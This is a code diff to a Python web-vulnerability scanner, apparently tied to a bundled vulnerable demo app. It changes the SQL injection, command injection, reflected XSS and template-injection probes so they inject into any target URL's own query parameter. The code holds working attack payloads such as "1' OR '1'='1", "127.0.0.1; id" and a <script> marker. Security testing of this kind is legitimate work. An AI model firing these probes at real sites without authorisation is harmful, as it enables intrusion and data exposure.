@@ -10,12 +10,32 @@ from __future__ import annotations
 
 import re
 import time
-from urllib.parse import quote, urljoin
+from urllib.parse import (parse_qsl, quote, urlencode, urljoin, urlparse,
+                          urlunparse)
 
 from .base import JudgeResult, WebProbe, register
 from ..records import AttemptRec, StepRec
 
 MARK = "DAGGER-XSS-4417"
+
+
+def _param_url(base_url, param, value, fallback_path):
+    """Build a test URL by injecting `value` into an existing query parameter on
+    base_url (preferring `param` if present, else the first param found). If
+    base_url has no query string, fall back to the given demo path/param so the
+    probes still work against the bundled vulnerable-webapp target."""
+    pr = urlparse(base_url)
+    qs = parse_qsl(pr.query, keep_blank_values=True)
+    if not qs:
+        return urljoin(base_url, fallback_path)
+    names = [k for k, _ in qs]
+    target = param if param in names else names[0]
+    new_qs = [(k, value if k == target else v) for k, v in qs]
+    return urlunparse(pr._replace(query=urlencode(new_qs)))
+
+
+def _first_param(base_url):
+    return parse_qsl(urlparse(base_url).query, keep_blank_values=True)[0][0] if urlparse(base_url).query else ""
 
 
 def _req(http, method, url, note, **kw):
@@ -57,17 +77,22 @@ class SQLInjection(WebProbe):
 
     def execute(self, base_url, http):
         attempts = []
-        baseline_url = urljoin(base_url, "/products?id=1")
-        s0, r0 = _req(http, "GET", baseline_url, "Baseline request with benign id=1")
+        # Inject into the target URL's OWN query parameter when it has one
+        # (e.g. ?category=1 on a real endpoint); only fall back to the demo
+        # /products?id=1 path when base_url carries no parameters at all.
+        param = _first_param(base_url) or "id"
+        baseline_url = _param_url(base_url, param, "1", "/products?id=1")
+        s0, r0 = _req(http, "GET", baseline_url, "Baseline request with benign %s=1" % param)
         base_len = len(r0.text) if r0 is not None else 0
 
-        err_url = urljoin(base_url, "/products?id=" + quote("1'"))
+        err_url = _param_url(base_url, param, "1'", "/products?id=" + quote("1'"))
         s1, r1 = _req(http, "GET", err_url, "Inject a single quote to trigger a SQL error")
         err_text = (r1.text if r1 is not None else "")
         sql_err = bool(re.search(r"(sql|sqlite|syntax error|unrecognized token|near \")",
                                  err_text, re.I))
 
-        bool_url = urljoin(base_url, "/products?id=" + quote("1' OR '1'='1"))
+        bool_url = _param_url(base_url, param, "1' OR '1'='1",
+                              "/products?id=" + quote("1' OR '1'='1"))
         s2, r2 = _req(http, "GET", bool_url, "Boolean payload: 1' OR '1'='1 (dump all rows)")
         bool_len = len(r2.text) if r2 is not None else 0
 
@@ -100,8 +125,9 @@ class CommandInjection(WebProbe):
 
     def execute(self, base_url, http):
         payload = "127.0.0.1; id"
-        url = urljoin(base_url, "/ping?host=" + quote(payload))
-        s, r = _req(http, "GET", url, "Append `; id` to the host parameter (command chaining)")
+        param = _first_param(base_url) or "host"
+        url = _param_url(base_url, param, payload, "/ping?host=" + quote(payload))
+        s, r = _req(http, "GET", url, "Append `; id` to the %s parameter (command chaining)" % param)
         text = r.text if r is not None else ""
         m = re.search(r"uid=\d+\(.*?\)\s+gid=\d+\([^)]*\)", text)
         success = bool(m)
@@ -126,8 +152,9 @@ class ReflectedXSS(WebProbe):
 
     def execute(self, base_url, http):
         payload = f"<script>{MARK}</script>"
-        url = urljoin(base_url, "/search?q=" + quote(payload))
-        s, r = _req(http, "GET", url, "Submit a <script> payload in the search field")
+        param = _first_param(base_url) or "q"
+        url = _param_url(base_url, param, payload, "/search?q=" + quote(payload))
+        s, r = _req(http, "GET", url, "Submit a <script> payload in the %s parameter" % param)
         text = r.text if r is not None else ""
         success = payload in text
         evidence = payload if success else ""
@@ -215,7 +242,9 @@ class SecurityMisconfiguration(WebProbe):
         if r is not None:
             have = {k.lower() for k in r.headers}
             missing = [h for h in self.WANT if h not in have]
-        s2, r2 = _req(http, "GET", urljoin(base_url, "/products?id=" + quote("'")),
+        _sm_param = _first_param(base_url) or "id"
+        s2, r2 = _req(http, "GET",
+                      _param_url(base_url, _sm_param, "'", "/products?id=" + quote("'")),
                       "Trigger an error to check for verbose stack/SQL disclosure")
         verbose = bool(r2 is not None and re.search(r"(traceback|sqlite|at line \d|stack)",
                                                     r2.text, re.I))
@@ -305,10 +334,11 @@ class SSTI(WebProbe):
         expected = str(a * b)
         payloads = ["{{%d*%d}}" % (a, b), "${%d*%d}" % (a, b), "#{%d*%d}" % (a, b),
                     "{%d*%d}" % (a, b), "<%%= %d*%d %%>" % (a, b)]
+        param = _first_param(base_url) or "q"
         last = None
         for tpl in payloads:
-            url = urljoin(base_url, "/search?q=" + quote(tpl))
-            s, r = _req(http, "GET", url, "Inject a template expression (%s)" % tpl)
+            url = _param_url(base_url, param, tpl, "/search?q=" + quote(tpl))
+            s, r = _req(http, "GET", url, "Inject a template expression (%s) into %s" % (tpl, param))
             last = s
             text = r.text if r is not None else ""
             if expected in text and tpl not in text:
